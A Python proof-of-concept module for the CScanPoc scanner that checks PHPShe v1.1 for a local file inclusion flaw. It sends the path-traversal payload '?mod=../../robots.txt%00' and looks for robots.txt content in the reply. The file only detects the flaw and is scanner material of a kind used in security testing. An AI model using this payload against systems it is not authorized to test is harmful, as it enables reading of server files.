# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'PHPShe_0001_p' # 平台漏洞编号，留空
    name = 'PHPShe v1.1 文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2013-04-12'  # 漏洞公布时间
    desc = '''
        PHPShe v1.1 /phpshe/index.php?mod=../../robots.txt%00 文件包含漏洞。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/15124.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPShe'  # 漏洞应用名称
    product_version = 'PHPShe v1.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '24b98ed0-2a2d-4fba-a6cc-cda805fe81a9'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #根据实际环境确认软件默认目录
            payload = '/phpshe/index.php'
            data = '?mod=../../robots.txt%00'
            url = self.target + payload + data
            r = requests.get(url)

            if 'robots.txt' in r.text and 'User-agent' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
